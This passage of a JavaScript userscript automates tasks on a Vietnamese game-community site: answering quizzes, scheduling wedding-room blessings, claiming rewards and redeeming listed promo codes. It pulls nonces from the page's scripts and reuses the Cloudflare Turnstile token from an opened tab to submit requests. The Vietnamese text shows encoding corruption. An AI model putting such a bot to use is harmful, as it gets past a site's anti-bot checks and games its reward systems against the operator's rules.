            if (time !== '00:00') {
                logger.log(`üü° [Th√≠ Luy·ªán T√¥ng M√¥n] - Ch∆∞a ƒë·∫øn th·ªùi gian m·ªü | ${time}`)
            } else {
                return time
            }
        } else {
            console.log(`üî¥ [Th√≠ Luy·ªán T√¥ng M√¥n] - Kh√¥ng l·∫•y ƒë∆∞·ª£c d·ªØ li·ªáu get_remaining_time_tltm`)
        }
        return null
    }
}

class VanDap {
    async trigger() {
        try {
            const bank = Object.fromEntries(
                Object.entries(quizBank).map(([key, value]) => [normalize(key), value])
            )
            const questions = await this.loadQuizData()
            if (!questions.length) return
            for (const [index, value] of questions.entries()) {
                const correct = parseInt(value.is_correct, 10) || 0
                if (correct === 1) {
                    logger.log(`‚úÖ [V·∫•n ƒê√°p] - C√¢u ${index + 1} ‚û§ ƒê√∫ng`)
                } else if (correct === 2) {
                    logger.log(`‚ùå [V·∫•n ƒê√°p] - C√¢u ${index + 1} ‚û§ Sai`)
                } else {
                    const question = normalize(value.question)
                    const answer = bank[question] ?? ''
                    const options = value.options.map(option => typeof option === 'string' ? option : option.content)
                    const answerIndex = Math.max(0, Math.min(3, bestMatch(options, answer).bestIndex))
                    await this.saveQuizResult(value.id, answerIndex, index)
                }
            }
            logger.log(`üü¢ [V·∫•n ƒê√°p] - Ho√†n th√†nh.`)
        } catch (error) {
            console.log(`üî¥ [V·∫•n ƒê√°p] - L·ªói "trigger": ${error.message}`)
        }
    }

    async loadQuizData() {
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'load_quiz_data' })
        })
        const { success, data = {} } = result || {}
        const { questions = [], completed } = data || {}
        if (!success || !questions.length) {
            console.log('üî¥ [V·∫•n ƒê√°p] - Kh√¥ng l·∫•y ƒë∆∞·ª£c d·ªØ li·ªáu load_quiz_data.')
            return []
        }
        if (completed) {
            logger.log('üü¢ [V·∫•n ƒê√°p] - ƒê√£ ho√†n th√†nh.')
            return []
        }
        return questions
    }

    async saveQuizResult(id, answer, index) {
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'save_quiz_result', question_id: id, answer: answer })
        })
        if (result?.success === true) {
            const message = parseInt(result.data?.is_correct, 10) === 1
                ? `‚úÖ [V·∫•n ƒê√°p] - C√¢u ${index + 1} ‚û§ ƒê√∫ng`
                : `‚ùå [V·∫•n ƒê√°p] - C√¢u ${index + 1} ‚û§ Sai`
            logger.log(message)
        } else {
            logger.log(`‚ö†Ô∏è [V·∫•n ƒê√°p] - Ch∆∞a tr·∫£ l·ªùi c√¢u ${index + 1}.`)
        }
    }
}

class TienDuyen {
    async scheduleBlessing({ items = [], delay = 0, immediately = false, tab = null }) {
        try {
            const now = new Date()
            let pastIds = []
            const futureItems = []
            for (const item of items) {
                const { id, time } = item
                const [hour, minute] = time.split(':').map(Number)
                const target = new Date()
                target.setHours(hour, minute, delay, 0)
                const wait = target - now
                if (wait < 0) {
                    pastIds.push(id)
                } else {
                    futureItems.push({ id, time, wait })
                }
            }
            if (pastIds.length) {
                if (immediately) {
                    await this.scanBlessing(tab, false)
                } else {
                    logger.log(`‚è≠Ô∏è [Ti√™n Duy√™n] - ƒê√£ qu√° gi·ªù - B·ªè qua ph√≤ng c∆∞·ªõi ${pastIds}.`)
                }
            }
            futureItems.sort((lhs, rhs) => lhs.wait - rhs.wait)
            let lastTime = Date.now()
            for (const item of futureItems) {
                const { id, time, wait } = item
                const nowTime = Date.now()
                const waitTime = Math.max(wait - (nowTime - lastTime), 0)
                const hours = Math.floor(waitTime / 3600000)
                const minutes = Math.floor((waitTime % 3600000) / 60000)
                const seconds = Math.floor((waitTime % 60000) / 1000)
                logger.log(`‚è≥ [Ti√™n Duy√™n] - Ch√∫c ph√∫c ph√≤ng c∆∞·ªõi ${id} l√∫c ${time} s·∫Ω ch·∫°y sau ${hours} gi·ªù ${minutes} ph√∫t ${seconds} gi√¢y.`)
                await sleep(waitTime)
                await this.triggerBlessing({ id, tab })
                lastTime = Date.now()
            }
            if (tab && !tab.closed) tab.close()
        } catch (error) {
            console.log(`üî¥ [Ti√™n Duy√™n] - L·ªói "scheduleBlessing": ${error.message}`)
        }
    }

    async scanBlessing(tab = null, claimLiXi = true) {
        try {
            const rooms = await this.getAllWeddings()
            for (const room of rooms) {
                if (room.has_blessed !== true) {
                    logger.log(`‚ö†Ô∏è [Ti√™n Duy√™n] - Ch∆∞a ch√∫c ph√∫c ph√≤ng c∆∞·ªõi ${room.wedding_room_id}.`)
                    await this.triggerBlessing({ id: room.wedding_room_id, tab })
                } else if (room.has_sent_li_xi === true) {
                    if (claimLiXi) await this.claimLiXi(room.wedding_room_id)
                } else {
                    logger.log(`‚ö†Ô∏è [Ti√™n Duy√™n] - ph√≤ng c∆∞·ªõi ${room.wedding_room_id} ch∆∞a ph√°t L√¨ X√¨.`)
                }
            }
            const message = rooms.length
                ? 'üü¢ [Ti√™n Duy√™n] - ƒê√£ qu√©t xong.'
                : 'üü° [Ti√™n Duy√™n] - Kh√¥ng c√≥ ph√≤ng c∆∞·ªõi n√†o.'
            logger.log(message)
        } catch (error) {
            console.log(`üî¥ [Ti√™n Duy√™n] - L·ªói "scanBlessing": ${error.message}`)
        }
    }

    async triggerBlessing({ id, tab, retries = 5, delay = 10000, timeout = 15000 }) {
        const retry = async (reason = '') => {
            if (reason) logger.log(`‚Ü™Ô∏è [Ti√™n Duy√™n] - ${reason} ‚û§ Th·ª≠ l·∫°i c√≤n ${retries - 1} l·∫ßn...`)
            if (tab && !tab.closed) tab.location.replace('about:blank')
            retries--
            await sleep(delay)
        }

        while (retries > 0) {
            const targetURLString = `${DOMAIN}/phong-cuoi?id=${id}`
            if (!tab || tab.closed) {
                const page = await loadPage(targetURLString)
                if (await this.sendBlessing(id, null, page.doc)) return
                await retry(`Ch√∫c ph√∫c ph√≤ng c∆∞·ªõi ${id} th·∫•t b·∫°i`)
                continue
            }
            tab.location.replace(targetURLString)
            await sleep(250)
            await new Promise(resolve => {
                const interval = setInterval(() => {
                    if (tab.location.href === targetURLString) {
                        clearInterval(interval)
                        resolve()
                    }
                }, 500)
                setTimeout(() => {
                    clearInterval(interval)
                    resolve(false)
                }, timeout)
            })
            try {
                const loaded = await this.waitForPage(id, tab, timeout)
                if (!loaded) {
                    await retry(`Kh√¥ng t·∫£i ƒë∆∞·ª£c trang ph√≤ng c∆∞·ªõi ${id}`)
                    continue
                }
                if (tab.document.title.trim() === 'Ph√≤ng C∆∞·ªõi Kh√¥ng T·ªìn T·∫°i') {
                    await retry(`Ph√≤ng c∆∞·ªõi ${id} ch∆∞a m·ªü`)
                    continue
                }
                if (tab.document.querySelector('.blessing-message')) {
                    tab.location.replace('about:blank')
                    return logger.log(`üü¢ [Ti√™n Duy√™n] - ƒê√£ ch√∫c ph√∫c ph√≤ng c∆∞·ªõi ${id}.`)
                }
                const token = await this.waitForCFTurnstile(tab, timeout)
                if (token === '') {
                    await retry(`X√°c th·ª±c CF ph√≤ng c∆∞·ªõi ${id} th·∫•t b·∫°i`)
                    continue
                }
                const success = await this.sendBlessing(id, token, tab.document)
                if (success) return tab.location.replace('about:blank')
                await retry(`Ch√∫c ph√∫c ph√≤ng c∆∞·ªõi ${id} th·∫•t b·∫°i`)
            } catch (error) {
                await retry(`L·ªói x·ª≠ l√Ω trang ph√≤ng c∆∞·ªõi ${id}: ${error.message || error}`)
            }
        }
        console.log(`üî¥ [Ti√™n Duy√™n] - Ch√∫c ph√∫c ph√≤ng c∆∞·ªõi ${id} th·∫•t b·∫°i sau nhi·ªÅu l·∫ßn.`)
    }

    async waitForPage(id, tab, timeout = 15000) {
        return new Promise(resolve => {
            const interval = setInterval(() => {
                try {
                    if (tab.document && tab.document.readyState === 'complete') {
                        clearInterval(interval)
                        resolve(true)
                    }
                } catch (error) {
                    console.log(`üî¥ [Ti√™n Duy√™n] - L·ªói truy c·∫≠p th√¥ng tin ph√≤ng c∆∞·ªõi ${id}: ${error}`)
                    clearInterval(interval)
                    resolve(false)
                }
            }, 500)
            setTimeout(() => {
                clearInterval(interval)
                resolve(false)
            }, timeout)
        })
    }

    async waitForCFTurnstile(tab, timeout = 15000) {
        const observeValueChange = (input) => {
            return new Promise(resolve => {
                const observer = new MutationObserver(() => {
                    if (input.value && input.value.trim() !== '') {
                        observer.disconnect()
                        resolve(input.value)
                    }
                })
                observer.observe(input, { attributes: true, attributeFilter: ['value'] })
                setTimeout(() => {
                    observer.disconnect()
                    resolve('')
                }, timeout)
            })
        }

        const input = tab.document.querySelector('#cf-turnstile-response')
        if (!input) return null
        if (input.value && input.value.trim() !== '') return input.value
        return await observeValueChange(input)
    }

    async getAllWeddings() {
        const page = await loadPage(DOMAIN + '/tien-duyen')
        const variableJSON = parseVariableJSON(page.doc, 'better-messages-js-extra', 'Better_Messages')
        const nonce = variableJSON.nonce
        if (!nonce) {
            console.log(`üî¥ [Ti√™n Duy√™n] - Kh√¥ng t√¨m th·∫•y nonce show_all_wedding.`)
            return []
        }
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce },
            body: JSON.stringify({ action: 'show_all_wedding' })
        })
        return Array.isArray(result?.data) ? result.data : []
    }

    async claimLiXi(id) {
        const page = await loadPage(DOMAIN + '/phong-cuoi?id=' + id)
        const hasLiXiModal = page.doc.getElementById('liXiModal') !== null
        if (!hasLiXiModal) return
        const restNonce = Array.from(page.doc.querySelectorAll('script'))
            .map(script => script.textContent.match(/const\s+rest_nonce\s*=\s*['"]([^'"]+)['"]/))
            .find(match => match)?.[1]
        if (!restNonce) return console.log(`üî¥ [Ti√™n Duy√™n] - Kh√¥ng t√¨m th·∫•y nonce hh3d_receive_li_xi.`)
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': restNonce },
            body: JSON.stringify({ action: 'hh3d_receive_li_xi', wedding_room_id: id })
        })
        const message = result?.success === true
            ? `‚úÖ [Ti√™n Duy√™n] - M·ªü L√¨ X√¨ th√†nh c√¥ng ph√≤ng ${id} - Nh·∫≠n ${result.data?.amount} ${result.data?.name}`
            : `‚ùå [Ti√™n Duy√™n] - M·ªü L√¨ X√¨ th·∫•t b·∫°i - ${result?.data?.message || result}`
        logger.log(message)
    }

    async sendBlessing(id, token, doc) {
        const restNonce = Array.from(doc.querySelectorAll('script'))
            .map(script => script.textContent.match(/const\s+rest_nonce\s*=\s*['"]([^'"]+)['"]/))
            .find(match => match)?.[1]
        if (!restNonce) {
            console.log(`üî¥ [Ti√™n Duy√™n] - Kh√¥ng t√¨m th·∫•y nonce hh3d_add_blessing.`)
            return false
        }
        const message = blessingMessages[Math.floor(Math.random() * blessingMessages.length)]
        let bodyData = { action: 'hh3d_add_blessing', wedding_room_id: id, message }
        if (token) bodyData['cf-turnstile-response'] = token
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': restNonce },
            body: JSON.stringify(bodyData),
            retries: 0
        })
        if (result?.success === true) {
            logger.log(`üü¢ [Ti√™n Duy√™n] - Ch√∫c ph√∫c th√†nh c√¥ng ph√≤ng c∆∞·ªõi ${id}.`)
            return true
        } else {
            console.log(`üî¥ [Ti√™n Duy√™n] - Ch√∫c ph√∫c th·∫•t b·∫°i ph√≤ng c∆∞·ªõi ${id}:`, result?.message || result)
            return false
        }
    }
}

class TongMon {
    async triggerTeLe() {
        try {
            const page = await loadPage(DOMAIN + '/danh-sach-thanh-vien-tong-mon')
            const variableJSON = parseVariableJSON(page.doc, 'tong-mon-main-js-extra', 'TongMonConfig')
            const nonce = variableJSON.nonce
            if (await this.checkTeLeStatus(nonce)) return logger.log(`üü¢ [T·∫ø L·ªÖ] - ƒê√£ ho√†n th√†nh.`)
            await this.teLe(nonce)
        } catch (error) {
            console.log(`üî¥ [ƒêi·ªÉm Danh] - L·ªói "trigger": ${error.message}`)
        }
    }

    async checkTeLeStatus(nonce) {
        if (!nonce) return console.log(`üî¥ [T·∫ø L·ªÖ] - Kh√¥ng t√¨m th·∫•y nonce check_te_le_status.`)
        const result = await postRequest(TONGMON_URL + '/check-te-le-status', {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce }
        })
        return !!result?.success
    }

    async teLe(nonce) {
        if (!nonce) return console.log(`üî¥ [T·∫ø L·ªÖ] - Kh√¥ng t√¨m th·∫•y nonce te_le_tong_mon.`)
        const result = await postRequest(TONGMON_URL + '/te-le-tong-mon', {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce }
        })
        const message = result?.success === true
            ? `üü¢ [T·∫ø L·ªÖ] - Th√†nh c√¥ng.`
            : `üü° [T·∫ø L·ªÖ] - ${result?.message}`
        logger.log(message)
    }
}

class HoatDongNgay {
    async triggerReward() {
        try {
            const page = await loadPage(DOMAIN + '/bang-hoat-dong-ngay')
            const boxes = page.doc.querySelectorAll('[id^="reward-box-"]')
            let count = 0
            for (let i = 0; i < boxes.length; i++) {
                const box = boxes[i]
                const stage = i + 1
                if (box.classList.contains('claimed')) {
                    count += 1
                } else if (box.classList.contains('unlocked')) {
                    if (await this.claim(stage)) {
                        count += 1
                    }
                }
            }
            logger.log(`üü¢ [Ho·∫°t ƒê·ªông Ng√†y] - ƒê√£ nh·∫≠n ${count} r∆∞∆°ng th∆∞·ªüng.`)
        } catch (error) {
            console.log(`üî¥ [Ho·∫°t ƒê·ªông Ng√†y] - L·ªói "trigger": ${error.message}`)
        }
    }

    async claim(stage) {
        const result = await postRequest(ADMIN_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'daily_activity_reward', stage: 'stage' + stage })
        })
        const message = result?.success === true
            ? `‚úÖ [Ho·∫°t ƒê·ªông Ng√†y] - Nh·∫≠n th√†nh c√¥ng - R∆∞∆°ng ${stage}.`
            : `‚ùå [Ho·∫°t ƒê·ªông Ng√†y] - Nh·∫≠n th·∫•t b·∫°i - R∆∞∆°ng${result?.data?.message || result}.`
        logger.log(message)
        return !!result?.success
    }
}

class LinhThach {
    constructor(codes) {
        this.codes = codes
    }

    async trigger() {
        try {
            for (const code of this.codes) {
                await this.redeemLinhThach(code)
            }
            logger.log(`üü¢ [Linh Th·∫°ch] - ƒê√£ nh·∫≠p xong`)
        } catch (error) {
            console.log(`üî¥ [Linh Th·∫°ch] - L·ªói "trigger": ${error.message}`)
        }
    }

    async redeemLinhThach(code) {
        const page = await loadPage(DOMAIN + '/linh-thach')
        const nonce = page.html.match(/'nonce'\s*:\s*'([a-f0-9]+)'/i)?.[1]
        if (!nonce) return console.log(`üî¥ [Linh Th·∫°ch] - Kh√¥ng t√¨m th·∫•y nonce redeem_linh_thach.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'redeem_linh_thach', code, nonce, hold_timestamp: Math.floor(Date.now() / 1000) })
        })
        const message = result?.success === true
            ? `‚úÖ [Linh Th·∫°ch] - ${code} - ${result.data?.message || result.data}`
            : `‚ö†Ô∏è [Linh Th·∫°ch] - ${code} - ${result?.data?.message || result}`
        logger.log(message)
    }
}

// Danh s√°ch c√°c nhi·ªám v·ª• c·∫ßn th·ª±c hi·ªán.
// ‚û§ N·∫øu mu·ªën ch·∫°y nhi·ªám v·ª• n√†o, ch·ªâ c·∫ßn th√™m ID t∆∞∆°ng ·ª©ng v√†o m·∫£ng `tasks`.
// ‚û§ V√≠ d·ª•: tasks = [1, 4] - Ch·∫°y c√°c ho·∫°t ƒë·ªông ƒêi·ªÉm Danh, V·∫•n ƒê√°p, T·∫ø L·ªÖ v√† Ph√∫c L·ª£i.
// ‚û§ V√≠ d·ª•: tasks = [0, 2] - Ch·∫°y c√°c ho·∫°t ƒë·ªông Ti√™n Duy√™n, ƒê·ªï Th·∫°ch.
// Danh s√°ch nhi·ªám v·ª•:
//  0 - Ti√™n Duy√™n
//  1 - ƒêi·ªÉm Danh - V·∫•n ƒê√°p - T·∫ø L·ªÖ
//  2 - ƒê·ªï Th·∫°ch
//  3 - Th√≠ Luy·ªán T√¥ng M√¥n
//  4 - Ph√∫c L·ª£i
//  5 - Hoang V·ª±c
// 10 - Lu·∫≠n V√µ - G·ª≠i Khi√™u Chi·∫øn
const tasks = []

// Nh·∫≠n L√¨ X√¨ n·∫øu c√≥ (true ho·∫∑c false).
// ‚û§ blessingLiXi = true: Ch√∫c ph√∫c Ti√™n Duy√™n + Nh·∫≠n L√¨ X√¨.
// ‚û§ blessingLiXi = false: Ch·ªâ ch√∫c ph√∫c Ti√™n Duy√™n + Kh√¥ng nh·∫≠n L√¨ X√¨.
const blessingLiXi = true

// Lo·∫°i ƒë√° b·∫°n mu·ªën c∆∞·ª£c trong ƒê·ªï Th·∫°ch - T·ª´ 1 ƒë·∫øn 6 (number).
// ‚û§ N·∫øu mu·ªën thay ƒë·ªïi lo·∫°i ƒë√° ƒë·ªÉ c∆∞·ª£c, ch·ªâ c·∫ßn ch·ªânh l·∫°i c√°c con s·ªë trong m·∫£ng `bets`.
// ‚û§ V√≠ d·ª•: bets = [1, 4] - C∆∞·ª£c v√†o 2 lo·∫°i ƒë√° c√≥ t·ªâ l·ªá th∆∞·ªüng cao th·ª© 1 v√† th·ª© 4.
const bets = [1, 2]

// T·ª± ƒë·ªông nh·∫≠n khi√™u chi·∫øn trong Lu·∫≠n V√µ (true ho·∫∑c false).
// ‚û§ battleAutoOn = true: B·∫≠t t·ª± ƒë·ªông nh·∫≠n khi√™u chi·∫øn.
// ‚û§ battleAutoOn = false: T·∫Øt t·ª± ƒë·ªông nh·∫≠n khi√™u chi·∫øn.
const battleAutoOn = true

// T√πy ch·ªçn g·ª≠i khi√™u chi·∫øn trong Lu·∫≠n V√µ - `online` (true ho·∫∑c false) - `retries` (number).
// ‚û§ online: false = Kh√¥ng t·ª± ƒë·ªông t√¨m ƒë√°nh ng∆∞·ªùi Online khi l∆∞·ª£t g·ª≠i ng∆∞·ªùi Theo d√µi ch∆∞a ƒë·∫°t t·ªëi ƒëa.
// ‚û§ online: true = T·ª± ƒë·ªông t√¨m ƒë√°nh ng∆∞·ªùi Online khi l∆∞·ª£t g·ª≠i ng∆∞·ªùi Theo d√µi ch∆∞a ƒë·∫°t t·ªëi ƒëa.
// ‚û§ retries: 3 = S·ªë l·∫ßn t·∫£i l·∫°i danh s√°ch ng∆∞·ªùi Online.
const battleOptions = { online: true, retries: 3 }

// Danh s√°ch code c·∫ßn nh·∫≠p trong Linh Th·∫°ch (text).
// ‚û§ V√≠ d·ª•: codes = ["19THANG5", "HOATHINH3DSITE"] ho·∫∑c codes = ['19THANG5', 'HOATHINH3DSITE']
const codes = ["EMLAEMBEEMMUONDUOCQUA", "CODEBAOTRI ","HOATHINH3D3001A", "HOATHINH3D3001B","HOATHINH3D4001A ","HOATHINH3D4001B ","HOATHINH3D6001A ", "HOATHINH3D6001B ","HOATHINH3D9001A","HOATHINH3D9001B ","HOATHINH3D13001A ","HOATHINH3D13001B ", "HOATHINH3D19001A ", "HOATHINH3D19001B "]

{
    (async () => {
        
        if (codes.length) {
            const linhthach = new LinhThach(codes)
            await linhthach.trigger()
        }
        if (tasks.includes(0)) {
            const tienduyen = new TienDuyen()
            await tienduyen.scanBlessing(null, blessingLiXi)
        }
        if (tasks.includes(1)) {
            const diemdanh = new DiemDanh()
            await diemdanh.trigger()

            const vandap = new VanDap()
            await vandap.trigger()

            const tongmon = new TongMon()
            await tongmon.triggerTeLe()
        }
        if (tasks.includes(2)) {
            const dothach = new DoThach(bets)
            await dothach.trigger()
        }
        if (tasks.includes(3)) {
            const thiluyen = new ThiLuyenTongMon()
            await thiluyen.trigger()
        }
        if (tasks.includes(4)) {
            const phucloiduong = new PhucLoiDuong()
            await phucloiduong.trigger()
        }
        if (tasks.includes(5)) {
            const hoangvuc = new HoangVuc()
            await hoangvuc.trigger()
        }

        const luanvo = new LuanVo()
        if (tasks.includes(10)) {
            await luanvo.triggerReceive(battleAutoOn)
            await luanvo.triggerSend(battleOptions)
        }
        await luanvo.triggerReceive(battleAutoOn)

        const hoatdongngay = new HoatDongNgay()
        await hoatdongngay.triggerReward()

        logger.log('¬©Th√≠ch B·ªën L√π Ngon Th∆°m Ng·ªçt N∆∞·ªõc Tr·∫Øng H·ªìng')
        logger.log('¬©T·ªßn ƒê·∫πp Trai')
    })()}
})();
